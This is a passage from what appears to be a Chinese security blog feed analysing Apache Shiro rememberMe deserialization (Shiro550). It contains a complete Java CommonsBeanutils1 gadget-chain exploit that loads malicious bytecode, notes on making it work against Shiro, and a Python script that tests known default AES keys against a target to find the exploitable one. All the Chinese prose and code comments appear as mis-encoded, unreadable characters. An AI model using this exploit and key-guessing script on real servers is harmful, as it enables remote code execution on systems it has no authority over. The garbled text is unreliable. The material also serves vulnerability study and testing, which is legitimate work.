class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ³¨é‡Šæ¥è‡ªAIï¼Œä»…ä¾›å‚è€ƒ</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆ›å»ºTemplatesImplå¯¹è±¡ç”¨äºåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br><br>        <span class="hljs-comment">// è¯»å–æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;evil.class&quot;</span>));<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">// åˆ›å»ºBeanComparatorï¼Œä½¿ç”¨AttrCompareä½œä¸ºå†…éƒ¨æ¯”è¾ƒå™¨</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>        <span class="hljs-comment">// åˆ›å»ºPriorityQueueï¼Œä½†ä¸ç«‹å³æ·»åŠ å…ƒç´ </span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);<br><br>        <span class="hljs-comment">// ç›´æ¥é€šè¿‡åå°„è®¾ç½®é˜Ÿåˆ—å†…å®¹ï¼Œé¿å…æ·»åŠ å…ƒç´ æ—¶è§¦å‘æ¯”è¾ƒ</span><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span><br>        serialize(queue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * é€šè¿‡åå°„è®¾ç½®å¯¹è±¡çš„ç§æœ‰å­—æ®µå€¼</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj è¦è®¾ç½®å­—æ®µçš„å¯¹è±¡</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> fieldName å­—æ®µåç§°</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value è¦è®¾ç½®çš„å­—æ®µå€¼</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception å½“æ“ä½œå¤±è´¥æ—¶æŠ›å‡º</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å°†å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj è¦åºåˆ—åŒ–çš„å¯¹è±¡</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException å½“æ–‡ä»¶å†™å…¥å‘ç”Ÿé”™è¯¯æ—¶æŠ›å‡º</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>        System.out.println(<span class="hljs-string">&quot;å¯¹è±¡å·²åºåˆ—åŒ–åˆ° ser.bin æ–‡ä»¶&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> filename è¦è¯»å–çš„æ–‡ä»¶å</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ååºåˆ—åŒ–åçš„å¯¹è±¡</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException å½“æ–‡ä»¶è¯»å–å‘ç”Ÿé”™è¯¯æ—¶æŠ›å‡º</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassNotFoundException å½“æ‰¾ä¸åˆ°å¯¹åº”ç±»æ—¶æŠ›å‡º</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ois.readObject();<br>            System.out.println(<span class="hljs-string">&quot;ååºåˆ—åŒ–æˆåŠŸå®Œæˆ&quot;</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ•è·åˆ°å¼‚å¸¸: &quot;</span> + e.getClass().getName());<br>            System.out.println(<span class="hljs-string">&quot;è¿™å¯èƒ½æ˜¯æˆåŠŸæ‰§è¡Œæ¶æ„ä»£ç çš„æ ‡å¿—&quot;</span>);<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            ois.close();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ“ä½œè·Ÿä¸Šæ–¹ç±»ä¼¼ï¼Œååºåˆ—åŒ–åè¿›è¡ŒåŠ å¯†å³å¯</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2022.13.23@2x.png" alt="CleanShot 2025-08-08 at 22.13.23@2x"></p><h2 id="æ‰“CBå­˜åœ¨çš„é—®é¢˜"><a href="#æ‰“CBå­˜åœ¨çš„é—®é¢˜" class="headerlink" title="æ‰“CBå­˜åœ¨çš„é—®é¢˜"></a>æ‰“CBå­˜åœ¨çš„é—®é¢˜</h2><h3 id="ysoserialä¸­CCç‰ˆæœ¬é—®é¢˜"><a href="#ysoserialä¸­CCç‰ˆæœ¬é—®é¢˜" class="headerlink" title="ysoserialä¸­CCç‰ˆæœ¬é—®é¢˜"></a>ysoserialä¸­CCç‰ˆæœ¬é—®é¢˜</h3><p><img src="https://img1.plumstar.cn/upload5202110131617685.jpeg"></p><p>ç½‘ä¸Šå·²ç»åˆ†æçš„å¾ˆæ˜ç™½äº†ï¼Œæˆ‘å°±ä¸å¤šèµ˜è¿°äº†ï¼Œcommons-beanutils:commons-beanutilsç‰ˆæœ¬çš„é—®é¢˜ï¼Œshiroæ˜¯1.8.3ï¼Œysoserialæ˜¯1.9.2ï¼ŒåŒºåˆ«å°±åœ¨è¿™é‡Œï¼Œä¸Šé¢æ²¡æœ‰é—®é¢˜æ˜¯å› ä¸ºæˆ‘æ˜¯ç›´æ¥ç”¨çš„shiroé‡Œçš„ç‰ˆæœ¬ä¸€è‡´ï¼Œæ‰€ä»¥æœªå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œç‰ˆæœ¬ç”¨ä¸€è‡´å³å¯ï¼Œå› ä¸ºç‰ˆæœ¬æ”¹çš„ä»£ç æŒºå¤šçš„</p><h3 id="æœªæ‰¾åˆ°ComparableComparatorç±»"><a href="#æœªæ‰¾åˆ°ComparableComparatorç±»" class="headerlink" title="æœªæ‰¾åˆ°ComparableComparatorç±»"></a>æœªæ‰¾åˆ°ComparableComparatorç±»</h3><p>è¿™ä¸ªé”™è¯¯è¿˜æ˜¯æŒºæœ‰æ„æ€çš„</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Unable <span class="hljs-keyword">to</span> load <span class="hljs-keyword">class</span> <span class="hljs-title class_">named</span> [org.apache.commons.collections.comparators.ComparableComparator]<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-09%20at%2015.54.22@2x.png" alt="CleanShot 2025-08-09 at 15.54.22@2x"></p><p>ç®€å•æ¥è¯´å°±æ˜¯æ²¡æ‰¾åˆ° <code>org.apache.commons.collections.comparators.ComparableComparator</code> ç±»ï¼Œä»åŒ…åå³å¯çœ‹å‡ºï¼Œè¿™ä¸ªç±»æ˜¯æ¥è‡ªäº <code>commons-collections</code>ã€‚</p><p><code>commons-beanutils</code> æœ¬æ¥ä¾èµ–äº <code>commons-collections</code>ï¼Œä½†æ˜¯åœ¨ Shiro ä¸­ï¼Œå®ƒçš„ <code>commons-beanutils</code> è™½ç„¶åŒ…å«äº†ä¸€éƒ¨åˆ† <code>commons-collections</code> çš„ç±»ï¼Œä½†å´ä¸å…¨ã€‚è¿™ä¹Ÿå¯¼è‡´ï¼Œæ­£å¸¸ä½¿ç”¨ Shiro çš„æ—¶å€™ä¸éœ€è¦ä¾èµ–äº commons-collectionsï¼Œä½†ååºåˆ—åŒ–åˆ©ç”¨çš„æ—¶å€™éœ€è¦ä¾èµ–äºcommons-collectionsã€‚</p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯å»æ‰¾CBä¾èµ–ä¸­è°ƒç”¨ComparableComparatorç±»çš„åœ°æ–¹ï¼Œå®šä½åˆ°<code>org.apache.commons.beanutils.BeanComparator#BeanComparator</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.09.23@2x.png" alt="CleanShot 2025-08-08 at 23.09.23@2x"></p><p>åœ¨ <code>BeanComparator</code> ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥ <code>Comparator</code> çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ <code>ComparableComparator</code> ã€‚</p><p>æ—¢ç„¶æ­¤æ—¶æ²¡æœ‰ <code>ComparableComparator</code> ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š</p><ul><li>å®ç° java.util.Comparator æ¥å£</li><li>å®ç° java.io.Serializable æ¥å£ Javaã€shiro æˆ– commons-beanutils è‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º</li></ul><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.28.57@2x.png" alt="CleanShot 2025-08-08 at 23.28.57@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2023.29.40@2x.png" alt="CleanShot 2025-08-08 at 23.29.40@2x"></p><p>åŒæ—¶æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶å³å¯ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªèƒ½ç”¨çš„å°±å¥½äº†ï¼Œä¾‹å¦‚com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompareæˆ–è€…java.lang.String.CaseInsensitiveComparatorå‡å®ç°äº†è¿™ä¸¤ä¸ªæ¥å£ï¼Œé‚£ä¹ˆæ”¹å†™ä¸€ä¸‹expå³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-09%20at%2015.57.32@2x.png" alt="CleanShot 2025-08-09 at 15.57.32@2x"></p><p>ä¸Šå›¾çš„expè¿˜æ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œåœ¨æ·»åŠ å…ƒç´ åˆ° PriorityQueue æ—¶ï¼Œä½¿ç”¨äº† AttrCompare æ¯”è¾ƒå™¨ï¼Œä½†å®ƒæœŸæœ›æ¯”è¾ƒçš„æ˜¯ Attr ç±»å‹çš„å¯¹è±¡ï¼Œè€Œå®é™…æ·»åŠ çš„æ˜¯ Integer ç±»å‹çš„å¯¹è±¡ï¼Œå¯¼è‡´ç±»å‹è½¬æ¢å¼‚å¸¸çš„é”™è¯¯ï¼Œè¿™ä¸ªå°±å¾ˆå¥½æ”¹äº†ï¼Œä¿®æ”¹åŠæ³•å‚è€ƒæˆ‘ä¸Šé¢çš„exp</p><h1 id="0x05-æ¼æ´æ¢æµ‹"><a href="#0x05-æ¼æ´æ¢æµ‹" class="headerlink" title="0x05 æ¼æ´æ¢æµ‹"></a>0x05 æ¼æ´æ¢æµ‹</h1><h2 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><p>åœ¨åˆ©ç”¨ shiro æ¼æ´æ—¶éœ€è¦åˆ¤æ–­åº”ç”¨æ˜¯å¦ç”¨åˆ°äº† shiroã€‚åœ¨è¯·æ±‚åŒ…çš„ Cookie ä¸­ä¸º <code>rememberMe</code> å­—æ®µèµ‹ä»»æ„å€¼ï¼Œæ”¶åˆ°è¿”å›åŒ…çš„ Set-Cookie ä¸­å­˜åœ¨ <code>rememberMe=deleteMe</code> å­—æ®µï¼Œè¯´æ˜ç›®æ ‡æœ‰ä½¿ç”¨ Shiro æ¡†æ¶ï¼Œå¯ä»¥è¿›ä¸€æ­¥æµ‹è¯•ã€‚</p><h2 id="AESå¯†é’¥åˆ¤æ–­"><a href="#AESå¯†é’¥åˆ¤æ–­" class="headerlink" title="AESå¯†é’¥åˆ¤æ–­"></a>AESå¯†é’¥åˆ¤æ–­</h2><p>Shiro 1.2.4 ä»¥ä¸Šç‰ˆæœ¬å®˜æ–¹ç§»é™¤äº†ä»£ç ä¸­çš„é»˜è®¤å¯†é’¥ï¼Œè¦æ±‚å¼€å‘è€…è‡ªå·±è®¾ ç½®ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®ï¼Œåˆ™é»˜è®¤åŠ¨æ€ç”Ÿæˆï¼Œé™ä½äº†å›ºå®šå¯†é’¥æ³„æ¼çš„é£é™©ã€‚ ä½†æ˜¯å³ä½¿å‡çº§åˆ°äº†1.2.4ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå¾ˆå¤šå¼€æºçš„é¡¹ç›®ä¼šè‡ªå·±è®¾å®šå¯†é’¥ï¼Œä¹‹å‰æ£€æµ‹æˆ‘ä»¬å…¬å¸çš„æ—¶å€™å°±å‘ç°äº†è¿™ä¸ªé—®é¢˜ã€‚ç»™äº†æˆ‘ä»¬å¯ä»¥æ”¶é›†å¯†é’¥çš„é›†åˆï¼Œæˆ–è€…å¯¹å¯†é’¥è¿›è¡Œçˆ†ç ´çš„æœºä¼š</p><p>é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­å¯†é’¥æ˜¯å¦æ­£ç¡®å‘¢ï¼Ÿæ–‡ç«  <a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">ä¸€ç§å¦ç±»çš„ shiro æ£€æµ‹æ–¹å¼</a>æä¾›äº†æ€è·¯ï¼Œå½“å¯†é’¥ä¸æ­£ç¡®æˆ–ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œç›®æ ‡ Response åŒ…å« <code>Set-Cookieï¼šrememberMe=deleteMe</code> å­—æ®µï¼Œè€Œå½“å¯†é’¥æ­£ç¡®ä¸”æ²¡æœ‰ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œè¿”å›åŒ…ä¸å­˜åœ¨ <code>Set-Cookieï¼šrememberMe=deleteMe</code> å­—æ®µã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦æ„é€  payload æ’é™¤ç±»å‹è½¬æ¢é”™è¯¯ï¼Œè¿›è€Œå‡†ç¡®åˆ¤æ–­å¯†é’¥ã€‚</p><p>shiro åœ¨ 1.4.2 ç‰ˆæœ¬ä¹‹å‰ï¼Œ AES çš„æ¨¡å¼ä¸º CBCï¼Œ IV æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¹¶ä¸” IV å¹¶æ²¡æœ‰çœŸæ­£ä½¿ç”¨èµ·æ¥ï¼Œæ‰€ä»¥æ•´ä¸ª AES åŠ è§£å¯†è¿‡ç¨‹çš„ key å°±å¾ˆé‡è¦äº†ï¼Œæ­£æ˜¯å› ä¸º AES ä½¿ç”¨ Key æ³„æ¼å¯¼è‡´ååºåˆ—åŒ–çš„ cookie å¯æ§ï¼Œä»è€Œå¼•å‘ååºåˆ—åŒ–æ¼æ´ã€‚åœ¨ 1.4.2 ç‰ˆæœ¬åï¼Œshiro å·²ç»æ›´æ¢åŠ å¯†æ¨¡å¼ AES-CBC ä¸º AES-GCMï¼Œè„šæœ¬ç¼–å†™æ—¶éœ€è¦è€ƒè™‘åŠ å¯†æ¨¡å¼å˜åŒ–çš„æƒ…å†µã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):<br>    aesCipher = AES.new(secretKey, AES.MODE_GCM)<br>    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)<br>    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):<br>    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># æ­¤å¤„ç®€å•åˆ—ä¸¾å‡ ä¸ªå¯†é’¥</span><br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> <br>    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># CBCåŠ å¯†</span><br>            encryptor = AES.new(base64.b64decode(key), mode, iv)<br>            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®KEY ï¼š&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-comment"># GCMåŠ å¯†</span><br>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))<br>            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br> <br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®KEY:&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®key:&quot;</span> + key)<br>            <span class="hljs-keyword">return</span> key<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h1 id="0x06-å‚è€ƒé“¾æ¥"><a href="#0x06-å‚è€ƒé“¾æ¥" class="headerlink" title="0x06 å‚è€ƒé“¾æ¥"></a>0x06 å‚è€ƒé“¾æ¥</h1><p><a href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17572415.html">https://www.cnblogs.com/1vxyz/p/17572415.html</a></p><p><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p><p><a href="https://www.cnblogs.com/CVE-Lemon/p/17935937.html">https://www.cnblogs.com/CVE-Lemon/p/17935937.html</a></p><p><a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a></p>]]></content>
    
    
    <categories>
      
      <category>ååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ</title>
    <link href="/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    
